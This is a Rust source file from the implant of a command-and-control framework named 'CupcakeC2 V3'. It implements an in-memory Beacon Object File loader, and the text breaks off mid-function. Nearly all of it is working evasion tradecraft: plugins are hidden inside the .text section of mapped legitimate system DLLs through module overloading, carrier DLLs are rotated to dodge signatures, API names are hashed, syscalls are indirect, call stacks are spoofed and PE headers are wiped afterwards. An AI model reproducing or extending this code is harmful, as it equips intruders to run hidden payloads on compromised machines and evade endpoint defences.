// Client/core/src/loader/bof.rs
// CupcakeC2 V3 - BOF (Beacon Object File) Engine
// 负责解析、重定位并在内存中执行 COFF 格式插件。
// 支持 x86 和 x64 架构

use super::beacon_api;
use super::error::{BofError, BofResult};
use super::safety;
use log::{debug, info, warn};
use std::collections::HashMap;
use std::sync::Mutex;

// 符号缓存 - 避免重复解析相同符号
lazy_static::lazy_static! {
    static ref SYMBOL_CACHE: Mutex<HashMap<String, usize>> = Mutex::new(HashMap::new());
}

// --- COFF 常量定义 ---
const IMAGE_FILE_MACHINE_I386: u16 = 0x014c; // x86 (32-bit)
const IMAGE_FILE_MACHINE_AMD64: u16 = 0x8664; // x64 (64-bit)

// x64 重定位类型
const IMAGE_REL_AMD64_ADDR64: u16 = 1; // 64位绝对地址
const IMAGE_REL_AMD64_ADDR32: u16 = 2; // 32位绝对地址
const IMAGE_REL_AMD64_ADDR32NB: u16 = 3; // 32位相对于镜像基址
const IMAGE_REL_AMD64_REL32: u16 = 4; // 32位相对地址
const IMAGE_REL_AMD64_REL32_1: u16 = 5;
const IMAGE_REL_AMD64_REL32_2: u16 = 6;
const IMAGE_REL_AMD64_REL32_3: u16 = 7;
const IMAGE_REL_AMD64_REL32_4: u16 = 8;
const IMAGE_REL_AMD64_REL32_5: u16 = 9;

/// Per-execution IAT: `__imp_*` relocs need the **address of a pointer slot**,
/// not the function VA (code is typically `call qword ptr [rip+rel]`).
struct IatTable {
    /// Stable storage for function pointers (never reallocated)
    slots: Box<[usize; 512]>,
    count: usize,
    /// symbol name → slot index
    index: HashMap<String, usize>,
}

impl IatTable {
    fn new() -> Self {
        Self {
            slots: Box::new([0usize; 512]),
            count: 0,
            index: HashMap::new(),
        }
    }

    /// Return address of the IAT slot that holds `fn_addr`.
    fn slot_for(&mut self, name: &str, fn_addr: usize) -> usize {
        if let Some(&idx) = self.index.get(name) {
            self.slots[idx] = fn_addr;
            return (&self.slots[idx] as *const usize) as usize;
        }
        if self.count >= self.slots.len() {
            warn!("[!] IAT table full, cannot resolve {}", name);
            return 0;
        }
        let idx = self.count;
        self.slots[idx] = fn_addr;
        self.count += 1;
        self.index.insert(name.to_string(), idx);
        (&self.slots[idx] as *const usize) as usize
    }
}

// x86 重定位类型
#[allow(dead_code)]
const IMAGE_REL_I386_DIR32: u16 = 6; // 32位绝对地址
#[allow(dead_code)]
const IMAGE_REL_I386_DIR32NB: u16 = 7; // 32位相对于镜像基址
#[allow(dead_code)]
const IMAGE_REL_I386_REL32: u16 = 20; // 32位相对地址

// --- COFF 结构体定义 ---
#[repr(C, packed)]
#[derive(Copy, Clone)]
pub(super) struct CoffFileHeader {
    machine: u16,
    number_of_sections: u16,
    time_date_stamp: u32,
    pointer_to_symbol_table: u32,
    number_of_symbols: u32,
    size_of_optional_header: u16,
    characteristics: u16,
}

#[repr(C, packed)]
#[derive(Copy, Clone)]
pub(super) struct CoffSectionHeader {
    name: [u8; 8],
    misc: u32,
    virtual_address: u32,
    size_of_raw_data: u32,
    pointer_to_raw_data: u32,
    pointer_to_relocations: u32,
    pointer_to_linenumbers: u32,
    number_of_relocations: u16,
    number_of_linenumbers: u16,
    characteristics: u32,
}

#[repr(C, packed)]
#[derive(Copy, Clone)]
pub(super) struct CoffRelocation {
    virtual_address: u32,
    symbol_table_index: u32,
    typ: u16,
}

#[repr(C, packed)]
#[derive(Copy, Clone)]
pub(super) struct CoffSymbol {
    name: [u8; 8],
    value: u32,
    section_number: i16,
    typ: u16,
    storage_class: u8,
    num_aux: u8,
}

pub struct BofLoader;

impl BofLoader {
    /// 清除符号缓存
    /// 在需要重新加载 DLL 或更新系统状态时调用
    pub fn clear_symbol_cache() {
        if let Ok(mut cache) = SYMBOL_CACHE.lock() {
            cache.clear();
            debug!("[*] Symbol cache cleared");
        }
    }

    /// 获取符号缓存统计信息
    pub fn get_cache_stats() -> (usize, usize) {
        if let Ok(cache) = SYMBOL_CACHE.lock() {
            let total = cache.len();
            let resolved = cache.values().filter(|&&v| v != 0).count();
            (total, resolved)
        } else {
            (0, 0)
        }
    }

    /// 加载并运行一个 BOF 插件
    pub async fn execute(coff_data: &[u8], args: &[u8]) -> BofResult<String> {
        info!(
            "[*] Cupcake BOF Engine: Loading plugin ({} bytes)",
            coff_data.len()
        );

        // Reset output
        beacon_api::clear_bof_output();

        // 验证 COFF 文件头
        super::safety::validate_coff_header(coff_data)?;

        // 安全地读取文件头
        let header = unsafe { super::safety::read_packed_struct::<CoffFileHeader>(coff_data, 0)? };

        // 验证段表
        super::safety::validate_section_table(
            coff_data,
            std::mem::size_of::<CoffFileHeader>(),
            header.number_of_sections,
        )?;

        // 验证符号表
        if header.pointer_to_symbol_table > 0 && header.number_of_symbols > 0 {
            super::safety::validate_symbol_table(
                coff_data,
                header.pointer_to_symbol_table,
                header.number_of_symbols,
            )?;
        }

        // High-risk path: default stack spoof around map/protect/execute (sync bodies).
        let machine = header.machine;
        match machine {
            IMAGE_FILE_MACHINE_AMD64 => {
                info!("[*] Detected x64 BOF");
                crate::stealth::stack::with_spoofed_stack(|| {
                    Self::execute_x64_sync(coff_data, args, &header)
                })
            }
            IMAGE_FILE_MACHINE_I386 => {
                info!("[*] Detected x86 BOF");
                crate::stealth::stack::with_spoofed_stack(|| {
                    Self::execute_x86_sync(coff_data, args, &header)
                })
            }
            _ => Err(BofError::UnsupportedArchitecture(machine)),
        }
    }

    /// 执行 x64 BOF（同步；由 execute 外包 stack spoof）
    fn execute_x64_sync(
        coff_data: &[u8],
        args: &[u8],
        header: &CoffFileHeader,
    ) -> BofResult<String> {
        unsafe {
            // 1. True Module Overloading: rotate carrier DLLs (avoid single known xpsprint fingerprint)
            let base_addr = Self::map_rotated_carrier(false)?;

            debug!("[+] Carrier DLL mapped at: 0x{:X}", base_addr);

            // 2. 定位载体 DLL 的 .text 段
            use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER};

            // 验证 DOS 头
            if base_addr == 0 {
                return Err(BofError::MemoryAllocationFailed(
                    "Invalid base address".to_string(),
                ));
            }

            let dos_header = base_addr as *const IMAGE_DOS_HEADER;
            let e_lfanew = (*dos_header).e_lfanew;

            // 验证 NT 头偏移
            if e_lfanew < 0 || e_lfanew as usize > 0x1000 {
                return Err(BofError::InvalidCoffFormat(
                    "Invalid PE header offset".to_string(),
                ));
            }

            let nt_headers = (base_addr + e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
            let section_count = (*nt_headers).FileHeader.NumberOfSections;

            // 验证段数量
            if section_count == 0 || section_count > 96 {
                return Err(BofError::InvalidCoffFormat(format!(
                    "Invalid section count: {}",
                    section_count
                )));
            }

            let section_headers = (nt_headers as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>())
                as *const IMAGE_SECTION_HEADER;

            let mut carrier_text_addr = 0;
            let mut carrier_text_size = 0;
            for i in 0..section_count {
                let sec = &*section_headers.add(i as usize);
                if sec.Name.starts_with(b".text") {
                    carrier_text_addr = base_addr + sec.VirtualAddress as usize;
                    carrier_text_size = *sec.Misc.VirtualSize() as usize;

                    // 验证段大小
                    if carrier_text_size == 0 || carrier_text_size > 0x10000000 {
                        return Err(BofError::InvalidCoffFormat(format!(
                            "Invalid .text section size: 0x{:X}",
                            carrier_text_size
                        )));
                    }
                    break;
                }
            }

            if carrier_text_addr == 0 {
                return Err(BofError::SectionNotFound(".text".to_string()));
            }

            // 3. 将载体 .text 修改为 RW
            let mut old_protect = 0;
            let hash_nt_protect = crate::stealth::hash_api_name(b"NtProtectVirtualMemory");
            let mut region_size = carrier_text_size;
            let mut protect_addr = carrier_text_addr;
            crate::syscalls::indirect_syscall(
                hash_nt_protect,
                &[
                    0xFFFFFFFFFFFFFFFFu64 as usize,
                    &mut protect_addr as *mut _ as usize,
                    &mut region_size as *mut _ as usize,
                    0x04, // PAGE_READWRITE
                    &mut old_protect as *mut _ as usize,
                ],
            );

            // 4. Parse BOF sections — section table is after optional header
            let section_header_offset =
                std::mem::size_of::<CoffFileHeader>() + header.size_of_optional_header as usize;

            safety::validate_section_table(
                coff_data,
                section_header_offset,
                header.number_of_sections,
            )?;

            let bof_sections =
                (coff_data.as_ptr() as usize + section_header_offset) as *const CoffSectionHeader;

            safety::validate_symbol_table(
                coff_data,
                header.pointer_to_symbol_table,
                header.number_of_symbols,
            )?;

            let symbols = std::slice::from_raw_parts(
                (coff_data.as_ptr() as usize + header.pointer_to_symbol_table as usize)
                    as *const CoffSymbol,
                header.number_of_symbols as usize,
            );
            let string_table = (coff_data.as_ptr() as usize
                + header.pointer_to_symbol_table as usize
                + (header.number_of_symbols * 18) as usize)
                as *const u8;

            // Phase 1: map all sections (including BSS / zero-raw)
            let mut current_offset: usize = 0;
            let mut section_map = std::collections::HashMap::new();
            let mut pending_relocs: Vec<(usize, u32, u16)> = Vec::new(); // (dest_base, reloc_ptr, count)

            for i in 0..header.number_of_sections {
                let sec = &*bof_sections.add(i as usize);
                let raw_data_size = sec.size_of_raw_data as usize;
                // VirtualSize lives in misc for COFF/PE section headers
                let virtual_size = sec.misc as usize;
                let alloc_size = virtual_size.max(raw_data_size);
                if alloc_size == 0 {
                    continue;
                }

                if current_offset.checked_add(alloc_size).ok_or_else(|| {
                    BofError::InvalidCoffFormat("Section offset overflow".to_string())
                })? > carrier_text_size
                {
                    return Err(BofError::InvalidCoffFormat(format!(
                        "BOF sections exceed carrier .text size (0x{:X} > 0x{:X})",
                        current_offset + alloc_size,
                        carrier_text_size
                    )));
                }

                let dest = (carrier_text_addr + current_offset) as *mut u8;
                // Zero full virtual span (BSS + padding)
                std::ptr::write_bytes(dest, 0, alloc_size);

                if raw_data_size > 0 {
                    let raw_data_offset = sec.pointer_to_raw_data as usize;
                    if raw_data_offset.checked_add(raw_data_size).ok_or_else(|| {
                        BofError::BoundsCheckFailed {
                            offset: raw_data_offset,
                            size: coff_data.len(),
                        }
                    })? > coff_data.len()
                    {
                        return Err(BofError::BoundsCheckFailed {
                            offset: raw_data_offset + raw_data_size,
                            size: coff_data.len(),
                        });
                    }
                    let src = coff_data.as_ptr().add(raw_data_offset);
                    safety::safe_copy_memory(
                        dest,
                        src,
                        raw_data_size,
                        carrier_text_addr,
                        carrier_text_size,
                    )?;
                }

                section_map.insert(i + 1, dest as usize); // 1-indexed

                if sec.number_of_relocations > 0 {
                    safety::validate_relocation_table(
                        coff_data,
                        sec.pointer_to_relocations,
                        sec.number_of_relocations,
                    )?;
                    pending_relocs.push((
                        dest as usize,
                        sec.pointer_to_relocations,
                        sec.number_of_relocations,
                    ));
                }

                current_offset += alloc_size;
            }

            // Phase 2: apply all relocations with full section_map + IAT
            let mut iat = IatTable::new();
            for (dest_base, reloc_off, reloc_count) in pending_relocs {
                let relocs = std::slice::from_raw_parts(
                    (coff_data.as_ptr() as usize + reloc_off as usize) as *const CoffRelocation,
                    reloc_count as usize,
                );
                Self::patch_symbols(
                    dest_base as *mut u8,
                    relocs,
                    symbols,
                    string_table,
                    &section_map,
                    &mut iat,
                );
            }

            // 5. Entry: go / _go (skip AUX records)
            let mut entry_point_addr = 0usize;
            let mut si = 0usize;
            while si < symbols.len() {
                let sym = &symbols[si];
                let name = Self::get_symbol_name(sym, string_table);
                if name == "go" || name == "_go" {
                    let base = *section_map.get(&(sym.section_number as u16)).unwrap_or(&0);
                    if base != 0 {
                        entry_point_addr = base + sym.value as usize;
                        break;
                    }
                }
                si += 1 + sym.num_aux as usize;
            }

            if entry_point_addr == 0 {
                Self::release_carrier_mapping(base_addr);
                return Err(BofError::EntryPointNotFound("go".to_string()));
            }

            // 6. Restore RX and execute
            crate::syscalls::indirect_syscall(
                hash_nt_protect,
                &[
                    0xFFFFFFFFFFFFFFFFu64 as usize,
                    &mut protect_addr as *mut _ as usize,
                    &mut region_size as *mut _ as usize,
                    0x20, // PAGE_EXECUTE_READ
                    &mut old_protect as *mut _ as usize,
                ],
            );

            let go: extern "C" fn(*const u8, i32) = std::mem::transmute(entry_point_addr);
            go(args.as_ptr(), args.len() as i32);

            // Keep IAT slots alive until after go() returns
            let _ = iat;

            let out = beacon_api::get_bof_output();
            Self::release_carrier_mapping(base_addr);
            Ok(out)
        }
    }

    /// Best-effort: wipe and unmap carrier view after BOF execution.
    unsafe fn release_carrier_mapping(base_addr: usize) {
        if base_addr == 0 {
            return;
        }
        // Zero first page headers to reduce PE signature residue
        let wipe = std::slice::from_raw_parts_mut(base_addr as *mut u8, 0x1000.min(4096));
        for b in wipe.iter_mut() {
            *b = 0;
        }
        let mut base = base_addr;
        let mut size: usize = 0;
        let _ = crate::syscalls::indirect_syscall(
            crate::stealth::hash_api_name(b"NtUnmapViewOfSection"),
            &[
                0xFFFFFFFFFFFFFFFFu64 as usize, // NtCurrentProcess
                base,
            ],
        );
        // Fallback: free if unmap unavailable
        let _ = crate::syscalls::indirect_syscall(
            crate::stealth::hash_api_name(b"NtFreeVirtualMemory"),
            &[
                0xFFFFFFFFFFFFFFFFu64 as usize,
                &mut base as *mut _ as usize,
                &mut size as *mut _ as usize,
                0x8000, // MEM_RELEASE
            ],
        );
        let _ = size;
    }

    /// 执行 x86 BOF (32位)
    fn execute_x86_sync(
        _coff_data: &[u8],
        _args: &[u8],
        _header: &CoffFileHeader,
    ) -> BofResult<String> {
        #[cfg(target_arch = "x86_64")]
        {
            return Err(BofError::architecture_mismatch("x86", "x64"));
        }

        #[cfg(target_arch = "x86")]
        unsafe {
            let coff_data = _coff_data;
            let args = _args;
            let header = _header;
            // 1. Module Overloading: rotate carrier DLLs (WOW64 path)
            let base_addr = Self::map_rotated_carrier(true)?;

            debug!("[+] Carrier DLL mapped at: 0x{:X}", base_addr);

            // 2. 定位载体 DLL 的 .text 段
            use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS32, IMAGE_SECTION_HEADER};
            let dos_header = base_addr as *const IMAGE_DOS_HEADER;
            let nt_headers =
                (base_addr + (*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS32;
            let section_headers = (nt_headers as usize + std::mem::size_of::<IMAGE_NT_HEADERS32>())
                as *const IMAGE_SECTION_HEADER;

            let mut carrier_text_addr = 0;
            let mut carrier_text_size = 0;
            for i in 0..(*nt_headers).FileHeader.NumberOfSections {
                let sec = &*section_headers.add(i as usize);
                if sec.Name.starts_with(b".text") {
                    carrier_text_addr = base_addr + sec.VirtualAddress as usize;
                    carrier_text_size = *sec.Misc.VirtualSize() as usize;
                    break;
                }
            }

            if carrier_text_addr == 0 {
                return Err(BofError::SectionNotFound(".text".to_string()));
            }

            // 3. 将载体 .text 修改为 RW
            let mut old_protect = 0;
            let hash_nt_protect = crate::stealth::hash_api_name(b"NtProtectVirtualMemory");
            let mut region_size = carrier_text_size;
            let mut protect_addr = carrier_text_addr;
            crate::syscalls::indirect_syscall(
                hash_nt_protect,
                &[
                    0xFFFFFFFFu32 as usize, // NtCurrentProcess for x86
                    &mut protect_addr as *mut _ as usize,
                    &mut region_size as *mut _ as usize,
                    0x04, // PAGE_READWRITE
                    &mut old_protect as *mut _ as usize,
                ],
            );

            // 4. Section table after optional header; two-phase map + x86 reloc
            let section_header_offset =
                std::mem::size_of::<CoffFileHeader>() + header.size_of_optional_header as usize;

            safety::validate_section_table(
                coff_data,
                section_header_offset,
                header.number_of_sections,
            )?;

            let bof_sections =
                (coff_data.as_ptr() as usize + section_header_offset) as *const CoffSectionHeader;

            safety::validate_symbol_table(
                coff_data,
                header.pointer_to_symbol_table,
                header.number_of_symbols,
            )?;

            let symbols = std::slice::from_raw_parts(
                (coff_data.as_ptr() as usize + header.pointer_to_symbol_table as usize)
                    as *const CoffSymbol,
                header.number_of_symbols as usize,
            );
            let string_table = (coff_data.as_ptr() as usize
                + header.pointer_to_symbol_table as usize
                + (header.number_of_symbols * 18) as usize)
                as *const u8;

            let mut current_offset: usize = 0;
            let mut section_map = std::collections::HashMap::new();
            let mut pending_relocs: Vec<(usize, u32, u16)> = Vec::new();

            for i in 0..header.number_of_sections {
                let sec = &*bof_sections.add(i as usize);
                let raw_data_size = sec.size_of_raw_data as usize;
                let virtual_size = sec.misc as usize;
                let alloc_size = virtual_size.max(raw_data_size);
                if alloc_size == 0 {
                    continue;
                }

                if current_offset.checked_add(alloc_size).ok_or_else(|| {
                    BofError::InvalidCoffFormat("Section offset overflow".to_string())
                })? > carrier_text_size
                {
                    return Err(BofError::InvalidCoffFormat(format!(
                        "BOF sections exceed carrier .text size (0x{:X} > 0x{:X})",
                        current_offset + alloc_size,
                        carrier_text_size
                    )));
                }

                let dest = (carrier_text_addr + current_offset) as *mut u8;
                std::ptr::write_bytes(dest, 0, alloc_size);

                if raw_data_size > 0 {
                    let raw_data_offset = sec.pointer_to_raw_data as usize;
                    if raw_data_offset.checked_add(raw_data_size).ok_or_else(|| {
                        BofError::BoundsCheckFailed {
                            offset: raw_data_offset,
                            size: coff_data.len(),
                        }
                    })? > coff_data.len()
                    {
                        return Err(BofError::BoundsCheckFailed {
                            offset: raw_data_offset + raw_data_size,
                            size: coff_data.len(),
                        });
                    }
                    let src = coff_data.as_ptr().add(raw_data_offset);
                    safety::safe_copy_memory(
                        dest,
                        src,
                        raw_data_size,
                        carrier_text_addr,
                        carrier_text_size,
                    )?;
                }

                section_map.insert(i + 1, dest as usize);

                if sec.number_of_relocations > 0 {
                    safety::validate_relocation_table(
                        coff_data,
                        sec.pointer_to_relocations,
                        sec.number_of_relocations,
                    )?;
                    pending_relocs.push((
                        dest as usize,
                        sec.pointer_to_relocations,
                        sec.number_of_relocations,
                    ));
                }

                current_offset += alloc_size;
            }

            let mut iat = IatTable::new();
            for (dest_base, reloc_off, reloc_count) in pending_relocs {
                let relocs = std::slice::from_raw_parts(
                    (coff_data.as_ptr() as usize + reloc_off as usize) as *const CoffRelocation,
                    reloc_count as usize,
                );
                Self::patch_symbols_x86(
                    dest_base as *mut u8,
                    relocs,
                    symbols,
                    string_table,
                    &section_map,
                    &mut iat,
                );
            }

            let mut entry_point_addr = 0usize;
            let mut si = 0usize;
            while si < symbols.len() {
                let sym = &symbols[si];
                let name = Self::get_symbol_name(sym, string_table);
                if name == "go" || name == "_go" {
                    let base = *section_map.get(&(sym.section_number as u16)).unwrap_or(&0);
                    if base != 0 {
                        entry_point_addr = base + sym.value as usize;
                        break;
                    }
                }
                si += 1 + sym.num_aux as usize;
            }

            if entry_point_addr == 0 {
                return Err(BofError::EntryPointNotFound("go".to_string()));
            }

            crate::syscalls::indirect_syscall(
                hash_nt_protect,
                &[
                    0xFFFFFFFFu32 as usize,
                    &mut protect_addr as *mut _ as usize,
                    &mut region_size as *mut _ as usize,
                    0x20, // PAGE_EXECUTE_READ
                    &mut old_protect as *mut _ as usize,
                ],
            );

            let go: extern "cdecl" fn(*const u8, i32) = std::mem::transmute(entry_point_addr);
            go(args.as_ptr(), args.len() as i32);
            let _ = iat;

            Ok(beacon_api::get_bof_output())
        }
    }

    /// True Module Overloading: 利用 SEC_IMAGE 映射合法 DLL
    unsafe fn module_overload_map(path: &str) -> BofResult<usize> {
        use winapi::shared::ntdef::{
            InitializeObjectAttributes, HANDLE, NULL, OBJECT_ATTRIBUTES, UNICODE_STRING,
        };
        use winapi::um::winnt::{
            FILE_GENERIC_READ, PAGE_READONLY, SECTION_MAP_EXECUTE, SECTION_MAP_READ, SEC_IMAGE,
        };

        // 1. 将路径转换为 UNICODE_STRING
        let mut path_u16: Vec<u16> = path.encode_utf16().collect();
        path_u16.push(0);
        let mut us_path = UNICODE_STRING {
            Length: ((path_u16.len() - 1) * 2) as u16,
            MaximumLength: (path_u16.len() * 2) as u16,
            Buffer: path_u16.as_mut_ptr(),
        };

        let mut obj_attr: OBJECT_ATTRIBUTES = std::mem::zeroed();
        InitializeObjectAttributes(&mut obj_attr, &mut us_path, 0x40, NULL, NULL);

        // 2. NtOpenFile
        let mut h_file: HANDLE = NULL;
        let mut io_status: [usize; 2] = [0, 0];
        let hash_nt_open_file = crate::stealth::hash_api_name(b"NtOpenFile");
        let status = crate::syscalls::indirect_syscall(
            hash_nt_open_file,
            &[
                &mut h_file as *mut _ as usize,
                FILE_GENERIC_READ as usize,
                &mut obj_attr as *mut _ as usize,
                &mut io_status as *mut _ as usize,
                1,    // FILE_SHARE_READ
                0x20, // FILE_NON_DIRECTORY_FILE
            ],
        );

        if status as i32 != 0 {
            // STATUS_SUCCESS is 0
            return Err(BofError::syscall_failed("NtOpenFile", status));
        }

        // 3. NtCreateSection (SEC_IMAGE)
        let mut h_section: HANDLE = NULL;
        let hash_nt_create_section = crate::stealth::hash_api_name(b"NtCreateSection");
        let status = crate::syscalls::indirect_syscall(
            hash_nt_create_section,
            &[
                &mut h_section as *mut _ as usize,
                (SECTION_MAP_READ | SECTION_MAP_EXECUTE) as usize,
                std::ptr::null_mut::<usize>() as usize, // ObjectAttributes
                std::ptr::null_mut::<usize>() as usize, // MaximumSize
                PAGE_READONLY as usize,
                SEC_IMAGE as usize,
                h_file as usize,
            ],
        );

        if status as i32 != 0 {
            let _ = crate::syscalls::indirect_syscall(
                crate::stealth::hash_api_name(b"NtClose"),
                &[h_file as usize],
            );
            return Err(BofError::syscall_failed("NtCreateSection", status));
        }

        // 4. NtMapViewOfSection
        let mut base_addr: usize = 0;
        let mut view_size: usize = 0;
        let hash_nt_map_view = crate::stealth::hash_api_name(b"NtMapViewOfSection");
        let status = crate::syscalls::indirect_syscall(
            hash_nt_map_view,
            &[
                h_section as usize,
                0xFFFFFFFFFFFFFFFFu64 as usize, // NtCurrentProcess
                &mut base_addr as *mut _ as usize,
                0, // ZeroBits
                0, // CommitSize
                0, // SectionOffset
                &mut view_size as *mut _ as usize,
                1, // ViewShare (InheritDisposition)
                0, // AllocationType
                PAGE_READONLY as usize,
            ],
        );

        // Cleanup handles
        let _ = crate::syscalls::indirect_syscall(
            crate::stealth::hash_api_name(b"NtClose"),
            &[h_section as usize],
        );
        let _ = crate::syscalls::indirect_syscall(
            crate::stealth::hash_api_name(b"NtClose"),
            &[h_file as usize],
        );

        if status as i32 != 0 {
            return Err(BofError::syscall_failed("NtMapViewOfSection", status));
        }

        Ok(base_addr)
    }

    /// Candidate carrier DLLs for module overloading (less single-signature than xpsprint alone).
    fn carrier_candidates(wow64: bool) -> &'static [&'static str] {
        if wow64 {
            &[
                "\\??\\C:\\Windows\\SysWOW64\\version.dll",
                "\\??\\C:\\Windows\\SysWOW64\\dbghelp.dll",
                "\\??\\C:\\Windows\\SysWOW64\\wer.dll",
                "\\??\\C:\\Windows\\SysWOW64\\netapi32.dll",
                "\\??\\C:\\Windows\\SysWOW64\\xpsprint.dll",
            ]
        } else {
            &[
                "\\??\\C:\\Windows\\System32\\version.dll",
                "\\??\\C:\\Windows\\System32\\dbghelp.dll",
                "\\??\\C:\\Windows\\System32\\wer.dll",
                "\\??\\C:\\Windows\\System32\\netapi32.dll",
                "\\??\\C:\\Windows\\System32\\xpsprint.dll",
            ]
        }
    }

    /// Map a randomly rotated carrier DLL; try next candidates on failure.
    fn map_rotated_carrier(wow64: bool) -> BofResult<usize> {
        let list = Self::carrier_candidates(wow64);
        if list.is_empty() {
            return Err(BofError::MemoryAllocationFailed(
                "no carrier DLL candidates".to_string(),
            ));
        }
        let start = crate::utils::random_range(0, (list.len() - 1) as u32) as usize;
        let mut last_err = BofError::MemoryAllocationFailed("carrier map failed".to_string());
        for i in 0..list.len() {
            let path = list[(start + i) % list.len()];
            match unsafe { Self::module_overload_map(path) } {
                Ok(base) => {
                    debug!("[+] Carrier DLL mapped: {} @ 0x{:X}", path, base);
                    return Ok(base);
                }
                Err(e) => {
                    last_err = e;
                }
            }
        }
        Err(last_err)
    }

    /// Pure helper: validate reloc symbol index against symbol table length.
    #[inline]
    pub fn reloc_symbol_index_in_bounds(index: u32, symbol_count: usize) -> bool {
        (index as usize) < symbol_count
    }

    /// Resolve an external / Beacon symbol to a **function VA**.
    fn resolve_symbol_fn(name: &str) -> usize {
        if let Some(rest) = name.strip_prefix("__imp_") {
            // __imp_BeaconPrintf / __imp__BeaconPrintf
            let clean = rest.trim_start_matches('_');
            if clean.starts_with("Beacon") {
                return Self::resolve_internal_beacon(clean);
            }
            return Self::resolve_external(name);
        }
        if name.starts_with("Beacon") || name.trim_start_matches('_').starts_with("Beacon") {
            return Self::resolve_internal_beacon(name.trim_start_matches('_'));
        }
        Self::resolve_external(name)
    }

    /// 核心符号修复逻辑 (Symbol Patching) - x64 版本
    unsafe fn patch_symbols(
        section_base: *mut u8,
        relocs: &[CoffRelocation],
        symbols: &[CoffSymbol],
        string_table: *const u8,
        section_map: &std::collections::HashMap<u16, usize>,
        iat: &mut IatTable,
    ) {
        for reloc in relocs {
            let idx = reloc.symbol_table_index as usize;
            if idx >= symbols.len() {
                warn!(
                    "[!] BOF reloc symbol_table_index {} out of bounds (len={})",
                    idx,
                    symbols.len()
                );
                continue;
            }
            let symbol = &symbols[idx];
            let name = Self::get_symbol_name(symbol, string_table);

            let target_addr = if symbol.section_number > 0 {
                // Internal section ref (prefer over import even if named __imp_*)
                let base = *section_map
                    .get(&(symbol.section_number as u16))
                    .unwrap_or(&0);
                if base == 0 {
                    continue;
                }
                base + symbol.value as usize
            } else if name.starts_with("__imp_") {
                // Indirect import: reloc target = address of IAT slot holding fn VA
                let fn_addr = Self::resolve_symbol_fn(&name);
                if fn_addr == 0 {
                    continue;
                }
                let slot = iat.slot_for(&name, fn_addr);
                if slot == 0 {
                    continue;
                }
                slot
            } else if name.starts_with("Beacon")
                || name.trim_start_matches('_').starts_with("Beacon")
            {
                // Direct Beacon API reference
                Self::resolve_symbol_fn(&name)
            } else {
                // Other undefined symbols — try as import; use IAT for safety
                let fn_addr = Self::resolve_symbol_fn(&name);
                if fn_addr == 0 {
                    0
                } else if name.contains('$') || name.starts_with('_') {
                    // MODULE$API style often used as direct; still prefer IAT for consistency
                    iat.slot_for(&name, fn_addr)
                } else {
                    fn_addr
                }
            };

            if target_addr == 0 {
                continue;
            }

            let patch_addr = section_base.add(reloc.virtual_address as usize);
            let reloc_type = reloc.typ;

            match reloc_type {
                IMAGE_REL_AMD64_REL32
                | IMAGE_REL_AMD64_REL32_1
                | IMAGE_REL_AMD64_REL32_2
                | IMAGE_REL_AMD64_REL32_3
                | IMAGE_REL_AMD64_REL32_4
                | IMAGE_REL_AMD64_REL32_5 => {
                    // type 4 → extra 0; type 5 → extra 1; … type 9 → extra 5
                    let extra = (reloc_type as isize) - (IMAGE_REL_AMD64_REL32 as isize);
                    let offset = (target_addr as isize) - (patch_addr as isize) - 4 - extra;
                    *(patch_addr as *mut i32) = offset as i32;
                }
                IMAGE_REL_AMD64_ADDR64 => {
                    *(patch_addr as *mut u64) = target_addr as u64;
                }
                IMAGE_REL_AMD64_ADDR32 => {
                    *(patch_addr as *mut u32) = target_addr as u32;
                }
                IMAGE_REL_AMD64_ADDR32NB => {
                    warn!("[!] IMAGE_REL_AMD64_ADDR32NB not fully supported");
                }
                _ => {
                    warn!("[!] Unknown x64 relocation type: {}", reloc_type);
                }
            }
        }
    }

    /// 核心符号修复逻辑 (Symbol Patching) - x86 版本
    unsafe fn patch_symbols_x86(
        section_base: *mut u8,
        relocs: &[CoffRelocation],
        symbols: &[CoffSymbol],
        string_table: *const u8,
        section_map: &std::collections::HashMap<u16, usize>,
        iat: &mut IatTable,
    ) {
        for reloc in relocs {
            let idx = reloc.symbol_table_index as usize;
            if idx >= symbols.len() {
                warn!(
                    "[!] BOF x86 reloc symbol_table_index {} out of bounds (len={})",
                    idx,
                    symbols.len()
                );
                continue;
            }
            let symbol = &symbols[idx];
            let name = Self::get_symbol_name(symbol, string_table);

            let target_addr = if symbol.section_number > 0 {
                let base = *section_map
                    .get(&(symbol.section_number as u16))
                    .unwrap_or(&0);
                if base == 0 {
                    continue;
                }
                base + symbol.value as usize
            } else if name.starts_with("__imp_") {
                let fn_addr = Self::resolve_symbol_fn(&name);
                if fn_addr == 0 {
                    continue;
                }
                iat.slot_for(&name, fn_addr)
            } else if name.starts_with("Beacon") || name.starts_with("_Beacon") {
                Self::resolve_symbol_fn(&name)
            } else {
                Self::resolve_symbol_fn(&name)
            };

            if target_addr == 0 {
                continue;
            }

            let patch_addr = section_base.add(reloc.virtual_address as usize);

            match reloc.typ {
                IMAGE_REL_I386_DIR32 => {
                    *(patch_addr as *mut u32) = target_addr as u32;
                }
                IMAGE_REL_I386_REL32 => {
                    let offset = (target_addr as isize) - (patch_addr as isize) - 4;
                    *(patch_addr as *mut i32) = offset as i32;
                }
                IMAGE_REL_I386_DIR32NB => {
                    warn!("[!] IMAGE_REL_I386_DIR32NB not fully supported");
                }
                _ => {
                    let reloc_type = reloc.typ;
                    warn!("[!] Unknown x86 relocation type: {}", reloc_type);
                }
            }
        }
    }

    /// 解析外部符号
    /// 支持多种符号格式:
    /// 1. MODULE$API - 自定义格式 (例如: KERNEL32$CreateFileW)
    /// 2. __imp_API - 标准 COFF 格式 (例如: __imp_CreateFileW)
    /// 3. __imp__API@N - stdcall 调用约定 (例如: __imp__CreateFileW@12)
    fn resolve_external(name: &str) -> usize {
        // 检查缓存
        if let Ok(cache) = SYMBOL_CACHE.lock() {
            if let Some(&addr) = cache.get(name) {
                return addr;
            }
        }

        // 移除 __imp_ 前缀
        let clean_name = name.trim_start_matches("__imp_");

        // 格式 1: MODULE$API (自定义格式)
        if let Some(pos) = clean_name.find('$') {
            let module_name = &clean_name[..pos];
            let api_name = &clean_name[pos + 1..];

            unsafe {
                let h_module = crate::stealth::get_module_base(crate::stealth::hash_module_name(
                    module_name.as_bytes(),
                ));
                if h_module != 0 {
                    if let Some(addr) = crate::stealth::get_api_addr(
                        h_module,
                        crate::stealth::hash_api_name(api_name.as_bytes()),
